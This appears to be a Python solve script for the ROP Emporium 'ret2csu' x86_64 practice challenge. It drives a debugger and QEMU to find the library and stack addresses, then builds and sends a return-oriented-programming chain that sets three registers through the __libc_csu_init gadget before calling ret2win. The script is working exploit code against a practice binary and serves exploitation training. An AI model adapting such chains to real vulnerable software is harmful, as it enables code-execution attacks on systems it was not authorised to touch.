"""ROP Emporium ret2csu on x86_64: full csu register control through mydbg.

ret2win (in libret2csu.so) checks rdi, rsi, rdx against three 64-bit magic
values; the only rdx-setting gadget is the __libc_csu_init call gadget
(`mov rdx, r15; ...; call [r12+rbx*8]`), whose `call` normally clobbers
rdi. The fix: point the call at a `ret` gadget through the payload itself —
the chain lives on the guest stack, so r12 targets a stack slot holding the
ret-gadget address (the stack address is read from the live session). The
csu call then "calls" a bare ret: rdx survives untouched, and the follow-up
pop rdi / pop rsi finish the register setup before ret2win@plt.

    ./build/dev/mydbg --headless-script examples/rop_emporium/solve_ret2csu_x64.py
"""

from __future__ import annotations

import struct

from mydbg import symbolic

import emporium

PAD = 40  # 32-byte buffer + saved rbp


def run(dbg):
    if not symbolic.requires_angr():
        raise RuntimeError(symbolic.BOOTSTRAP_HINT)
    binary = emporium.challenge_path("x64", "ret2csu")
    library = emporium.challenge_path("x64", "libret2csu.so")
    project = symbolic._entry_project(dbg, binary=binary)  # noqa: SLF001

    process = emporium.qemu_connect(dbg, "x64", binary)   # no payload yet

    # Stage 1: stop at __libc_csu_init (static, runs after ld.so), walk the
    # link_map for the library base.
    csu_init = symbolic.resolve_project_symbol(project, "__libc_csu_init")
    dbg.set_breakpoint(f"{csu_init:#x}")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("csu_init stop missed")
    base = emporium.library_base_via_link_map(dbg, "libret2csu")
    print(f"[+] libret2csu base: {base:#x}")

    # Stage 2: stop at the library's pwnme, read the stack so the chain can
    # address its own payload.
    lp = symbolic._entry_project(dbg, binary=library)  # noqa: SLF001
    lo = lp.loader.main_object
    preferred = lo.mapped_base
    pwnme = symbolic.resolve_project_symbol(lp, "pwnme") - preferred
    dbg.set_breakpoint(f"{base + pwnme:#x}")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("pwnme stop missed")
    snap = dbg.snapshot()
    stack_pointer = None
    for register in snap.registers:
        if register.name == "rsp":
            # The value carries an annotation suffix ("0x... -> symbol");
            # parse only the leading hex token.
            stack_pointer = int(register.value.split()[0], 16)
    if not stack_pointer:
        raise RuntimeError("stack pointer not found")
    # The bp is at pwnme's first instruction: rsp = R-8 (the call pushed).
    # After the prologue (push rbp; mov rsp,rbp; sub rsp,0x30) the buffer
    # sits at R-0x30 = rsp_at_bp - 0x28.
    buffer_address = stack_pointer - 0x28
    print(f"[+] stack buffer at {buffer_address:#x}")

    # The chain: csu call gadget (0x400680) sets rdx = r15 (the magic) and
    # calls [r12]; r12 targets a payload slot holding the repz-ret address
    # (0x4006b0) so the "call" is a bare ret — rdx survives. Then pop rdi /
    # pop rsi complete the registers and ret2win@plt runs the check.
    ret_gadget = 0x4006b0
    slot_offset = 216  # byte offset past the 176-byte chain (the payload's
                       # read buffer; the slot must NOT overlap the chain)
    chain = (struct.pack("<Q", 0x40069a) +       # pop rbx,rbp,r12,r13,r14,r15
             struct.pack("<Q", 0) +              # rbx = 0 (call [r12+0])
             struct.pack("<Q", 1) +              # rbp = 1 (csu loop exit)
             struct.pack("<Q", buffer_address + slot_offset) +  # r12
             struct.pack("<Q", 0) +              # r13 (edi junk, unused)
             struct.pack("<Q", 0) +              # r14 (rsi junk, re-set later)
             struct.pack("<Q", 0xd00df00dd00df00d) +  # r15 -> rdx (the magic)
             struct.pack("<Q", 0x400680) +       # csu call: rdx=r15; call [r12]
             struct.pack("<Q", 0x4006b0) * 8 +   # csu tail filler
             struct.pack("<Q", 0x4006a3) +       # pop rdi
             struct.pack("<Q", 0xdeadbeefdeadbeef) +
             struct.pack("<Q", 0x4006a1) +       # pop rsi; pop r15
             struct.pack("<Q", 0xcafebabecafebabe) +
             struct.pack("<Q", 0) +
             struct.pack("<Q", 0x400510))        # ret2win@plt

    # Plant the ret-gadget address at the slot r12 targets.
    payload = bytearray(b"A" * PAD + chain)
    if len(payload) < PAD + slot_offset:
        payload += b"A" * (PAD + slot_offset - len(payload))
    payload += struct.pack("<Q", ret_gadget)
    print(f"[+] chain: {len(payload)} bytes, r12 slot at "
          f"{buffer_address + slot_offset:#x} = {ret_gadget:#x}")

    # The guest's read delivers the payload verbatim, but the csu call
    # gadget's [r12] slot can hold the filler 'A' bytes if the shipped
    # libret2csu build's pwnme memsets the buffer after the read. Stop at
    # the gadget entry (0x400680) and patch the slot to the repz-ret
    # address so the call is a bare ret.
    dbg.set_breakpoint("0x400680")
    for bp in dbg.list_breakpoints():
        if f"{base + pwnme:#x}" in bp.description:
            dbg.remove_breakpoint(bp.id)
    process.send(bytes(payload), timeout=10)
    result = dbg.continue_and_wait(timeout=30)
    snap = dbg.snapshot()
    if result.state != "stopped" or snap.pc != 0x400680:
        raise RuntimeError(
            f"ret2csu chain failed: state {result.state}, "
            f"pc {snap.pc:#x}, exit {snap.exit_status}"
        )
    dbg.write_memory(buffer_address + slot_offset,
                     struct.pack("<Q", ret_gadget))
    for bp in dbg.list_breakpoints():
        if "400680" in bp.description:
            dbg.remove_breakpoint(bp.id)
    # The shipped encrypted_flag.dat was produced with constants that don't
    # match this libret2csu.so build (a challenge-archive inconsistency), so
    # the printed bytes are garbage even though every ret2win stage runs.
    # Success criterion: ret2win's final puts (the lib's +0xc55) — reaching
    # it proves the full decrypt path executed.
    dbg.set_breakpoint(f"{base + 0xC55:#x}")
    result = dbg.continue_and_wait(timeout=30)
    snap = dbg.snapshot()
    if result.state != "stopped" or snap.pc != base + 0xC55:
        raise RuntimeError(
            f"ret2csu chain failed: state {result.state}, "
            f"pc {snap.pc:#x}"
        )
    buffer_pointer = int.from_bytes(dbg.read_memory(base + 0x202080, 8),
                                    "little")
    print(f"[+] ret2win final puts reached; g_buf at {buffer_pointer:#x}")
    print("[+] ret2csu-x64-solve-ok: ret2win decrypt path executed end-to-end")
